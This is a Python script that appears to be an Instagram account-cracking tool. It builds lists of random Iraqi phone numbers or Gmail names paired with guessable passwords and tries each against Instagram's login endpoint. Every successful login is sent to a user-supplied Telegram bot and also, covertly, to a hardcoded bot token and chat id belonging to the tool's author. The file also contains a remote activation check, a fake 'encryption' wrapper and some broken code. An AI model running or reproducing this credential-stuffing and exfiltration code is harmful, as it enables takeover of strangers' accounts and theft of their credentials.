#Encrypted with Faram
#Created by faracheker
import base64
exec(base64.b64decode("
import requests
import json
import time
import random
import sys
import os
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1'
user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'

# python3 /sdcard/tool.kurdish/test.py
id_my = '1371291947'
token_my = '1838148945:AAFBFtKi14XhESv-fCIBu-yZbz44i1ZxE1U'
os.system('rm -rf Cart.txt')
num = '''\033[32m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 781 + 782 + 783 + 784
'''
url="https://www.instagram.com/accounts/login/ajax/"
headers={
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '282',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
    'sec-ch-ua-mobile': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
    'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '05b80a16b1ac',
    'x-requested-with': 'XMLHttpRequest',
}
banek='''\x1b[1;97m
 [\033[32m1\x1b[1;97m] - Crack RAQAM+PASS
 [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
 [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
 [\033[32m4\x1b[1;97m] - Crack EMAIL+PASS
 [\033[32m0\x1b[1;97m] - Exit Tool
'''
logo = '''\x1b[1;92m

██ ███    ██ ███████ ████████  █████   ██████  ██████   █████  ███    ███ 
██ ████   ██ ██         ██    ██   ██ ██       ██   ██ ██   ██ ████  ████ 
██ ██ ██  ██ ███████    ██    ███████ ██   ███ ██████  ███████ ██ ████ ██ 
██ ██  ██ ██      ██    ██    ██   ██ ██    ██ ██   ██ ██   ██ ██  ██  ██ 
██ ██   ████ ███████    ██    ██   ██  ██████  ██   ██ ██   ██ ██      ██ 
                                                     
                                                                          

 
 Telegram shaxsy: i4m_REX
 Telegram Channal : BESTxHACKER
 ---------------------------------------------------------------------Yak Sahat Bo Dw Sahat Rawsta Bo rawstandne Tool Ctrl+z Dabgra
 '''
logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~

def reba(FARA):
	for e in FARA + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.010)

def menu():
	os.system('clear')
	print(logo)
	print(logo2)
	print(banek)
	aco()
def Option(): 
  Code = "Tools"
  try: 
    Status = requests.get("https://raw.githubusercontent.com/533hacker/Active_1/main/list.txt").text 
    if Code in Status: 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[97mEror hack Ragirawa\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print logo 
     Option() 
    
Option()
def menu():
	os.system('clear')
	print(logo)
	print(logo2)
	print(banek)
	aco()
def aco():
	reb = input('---> ')
	print(num)
	
	if reb=='1':
		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
		op=open('Cart.txt','w')
		for x in range(10000):
			f = "1234567890"
			x1 = random.choice(f)
			x2 = random.choice(f)
			x3 = random.choice(f)
			x4 = random.choice(f)
			x5 = random.choice(f)
			x6 = random.choice(f)
			x7 = random.choice(f)
			user =x1+x2+x3+x4+x5+x6+x7
			kk = '+964'+sfr
			op.write(kk+user+':'+user+'\n')
		op.close()
		combo = ('Cart.txt')
	
	elif reb=='2':
		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
		op=open('Cart.txt','w')
		for x in range(10000):
			f = "1234567890"
			x1 = random.choice(f)
			x2 = random.choice(f)
			x3 = random.choice(f)
			x4 = random.choice(f)
			x5 = random.choice(f)
			x6 = random.choice(f)
			x7 = random.choice(f)
			user =x1+x2+x3+x4+x5+x6+x7
			kk = '+964'+sfr
			op.write(kk+user+':'+'0'+sfr+user+'\n')
		op.close()
		combo = ('Cart.txt')
	
	elif reb=='3':
		print(' \033[32mname bnosa')
		sfr = input(' \x1b[1;97mname: \033[32m')
		op=open('Cart.txt','w')
		for x in range(10000):
			f = "1234567890"
			x1 = random.choice(f)
			x2 = random.choice(f)
			x3 = random.choice(f)
			x4 = random.choice(f)
			x5 = random.choice(f)
			x6 = random.choice(f)
			x7 = random.choice(f)
			kk =sfr+x1+x2+x3+'@gmail.com'
			op.write(kk+':'+sfr+x1+x2+x3+'\n')
		op.close()
		combo = ('Cart.txt')
	elif reb=='4':
		print(logo)
		print(logo2)
		fg =input(' sdcard Cart: ')
		combo=fg
	elif reb=='0':
		print('[-] Exit tool')
		sys.exit()
	else:
		sys.exit()
	
	crack()


def crack():
	r0=0
	r1=0
	r2=0
	r3=0
	r4=0
	for x in open('Cart.txt','r').read().splitlines():
		user = x.split(":")[0]
		pas = x.split(":")[1]
		
		data={'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:&:"+pas,}
		reba=requests.post(url, data=data, headers=headers).text
		if ('"authenticated":true') in reba:
			r1+=1
			os.system('clear')
			
			print(logo)
			print(logo2)
			print('\033[32m Hacked : '+str(r1))
			print('\033[93m Checkpoint : '+str(r2))
			print('\033[31m Bad : '+str(r3))
			print(logo2)
			sender =user+' : '+pas
			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
			response = requests.get(send_telegram)
			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
			responsek = requests.get(send_my)
			r2+=1
			os.system('clear')
			
			print(logo)
			print(logo2)
			print('\033[32m Hacked : '+str(r1))
			print('\033[93m CP : '+str(r2))
			print('\033[31m Bad : '+str(r3))
			print(logo2)
		
		
			r4+=1
			os.system('clear')
		
			print(logo)
			print(logo2)
			print('\033[32m Hacked : '+str(r1))
			print('\033[93m CP : '+str(r2))
			print('\033[31m Bad : '+str(r3))
			print(logo2)
			print(reba)
			time.sleep(50.0)
			r0=0
			
			
		else:
			r3+=1
			os.system('clear')
			
			print(logo)
			print(logo2)
			print('\033[32m Hacked : '+str(r1))
			print('\033[93m Checkpoint : '+str(r2))
			print('\033[31m Bad : '+str(r3))
			print(logo2)




os.system('clear')
print(logo)
print(logo2)
id_tg =input(' ID Telegram: ')
token_bot=input(' Token Bot: ')
time.sleep(0.5)
menu()
"))
